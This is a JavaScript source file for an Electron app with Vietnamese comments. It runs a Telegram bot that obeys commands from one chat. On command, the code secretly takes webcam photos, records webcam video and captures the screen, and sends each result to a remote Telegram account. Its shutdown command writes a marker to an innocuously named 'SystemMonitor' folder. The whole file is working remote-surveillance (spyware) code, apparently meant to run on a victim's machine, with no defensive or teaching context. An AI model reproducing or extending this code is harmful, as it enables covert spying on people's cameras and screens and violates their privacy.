// src/telebot.js - Hoàn chỉnh, fix lặp tin nhắn, tự shutdown, update cũ
const { Telegraf } = require('telegraf');
const { desktopCapturer } = require('electron');
const fs = require('fs');
const path = require('path');

const { capturePhoto, captureVideo, sendPhoto, sendVideo } = require('./utils');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let botRunning = false;

const bot = new Telegraf(BOT_TOKEN);

// Middleware kiểm tra quyền & bỏ qua update cũ
bot.use((ctx, next) => {
    const messageTime = ctx.message?.date || 0;
    const currentTime = Math.floor(Date.now() / 1000);
    if (messageTime < currentTime - 60) {
        console.log('[telebot] Bỏ qua update cũ:', ctx.updateType, ctx.message?.text);
        return;
    }

    if (ctx.chat && ctx.chat.id.toString() === CHAT_ID) {
        console.log('[telebot] Nhận lệnh mới:', ctx.message?.text);
        return next();
    }
});

// /start và /help
bot.command(['start', 'help'], (ctx) => {
    ctx.reply(
        'Chào chủ nhân! Bot điều khiển từ xa:\n\n' +
        '📸 /photo - Chụp ảnh webcam ngay\n' +
        '🎥 /video - Quay video 15 giây webcam\n' +
        '🖥️ /screenshot - Chụp màn hình máy tính\n' +
        '⏹️ /shutdown - Tắt ứng dụng ngay (cẩn thận)'
    );
});

// /photo
bot.command('photo', async (ctx) => {
    ctx.reply('Đang chụp ảnh webcam...').catch(() => { });
    try {
        await new Promise(resolve => setTimeout(resolve, 1000));
        const buffer = await capturePhoto();
        await sendPhoto(buffer);
        ctx.reply('Ảnh webcam đã gửi thành công!').catch(() => { });
    } catch (err) {
        console.error('[Telegram Bot] Lỗi chụp ảnh:', err.message);
        ctx.reply('Lỗi khi chụp ảnh: ' + (err.message || 'Không xác định')).catch(() => { });
    }
});

// /video
bot.command('video', async (ctx) => {
    ctx.reply('Đang quay video 15 giây...').catch(() => { });
    try {
        await new Promise(resolve => setTimeout(resolve, 1500));
        const buffer = await captureVideo(15);
        await sendVideo(buffer);
        ctx.reply('Video webcam đã gửi thành công!').catch(() => { });
    } catch (err) {
        console.error('[Telegram Bot] Lỗi quay video:', err.message);
        ctx.reply('Lỗi khi quay video: ' + (err.message || 'Không xác định')).catch(() => { });
    }
});

// /screenshot
bot.command('screenshot', async (ctx) => {
    ctx.reply('Đang chụp màn hình...').catch(() => { });
    try {
        const sources = await desktopCapturer.getSources({
            types: ['screen'],
            thumbnailSize: { width: 1920, height: 1080 }
        });

        if (sources.length === 0) throw new Error('Không tìm thấy màn hình');

        const image = sources[0].thumbnail.toPNG();

        await ctx.replyWithPhoto({ source: image }, {
            caption: `Màn hình lúc ${new Date().toLocaleString('vi-VN')}`
        }).catch(() => { });

        console.log('[Telegram Bot] Screenshot gửi thành công');
    } catch (err) {
        console.error('[Telegram Bot] Lỗi screenshot:', err.message);
        ctx.reply('Lỗi chụp màn hình: ' + (err.message || 'Không xác định')).catch(() => { });
    }
});

// /shutdown - Chỉ cho phép lệnh mới
bot.command('shutdown', (ctx) => {
    const messageTime = ctx.message.date;
    const currentTime = Math.floor(Date.now() / 1000);
    if (messageTime < currentTime - 30) {
        console.log('[telebot] Bỏ qua lệnh shutdown cũ');
        return;
    }

    ctx.reply('Đang tắt ứng dụng...').catch(() => { });
    console.log('[Telegram Bot] Nhận lệnh shutdown từ chủ nhân (mới)');
    setTimeout(() => {
        try {
            const programData = process.env.PROGRAMDATA || 'C:\\ProgramData';
            const markerDir = path.join(programData, 'SystemMonitor');
            const markerFile = path.join(markerDir, 'disabled');
            if (!fs.existsSync(markerDir)) {
                fs.mkdirSync(markerDir, { recursive: true });
            }
            fs.writeFileSync(markerFile, `disabled at ${new Date().toISOString()}`);
            console.log('[telebot] Created shutdown marker:', markerFile);
        } catch (err) {
            console.error('[telebot] Failed to create shutdown marker:', err);
        }

        console.log('[Telegram Bot] Thực hiện process.exit(0)');
        process.exit(0);
    }, 1000);
});

// Khởi động bot với lock
async function startTelegramBot() {
    if (botRunning) {
        console.log('[telebot] Bot đã chạy, bỏ qua');
        return;
    }

    try {
        // Clear pending updates
        await bot.telegram.getUpdates({ offset: -1, limit: 1 });
        console.log('[telebot] Đã clear pending updates');

        await bot.launch({ dropPendingUpdates: true });
        botRunning = true;
        console.log('[telebot] Telegram bot khởi động thành công');
    } catch (err) {
        console.error('[telebot] Lỗi khởi động bot:', err.message);
    }
}

function stopTelegramBot() {
    if (botRunning) {
        bot.stop('App tắt');
        botRunning = false;
    }
}

module.exports = {
    startTelegramBot,
    stopTelegramBot
};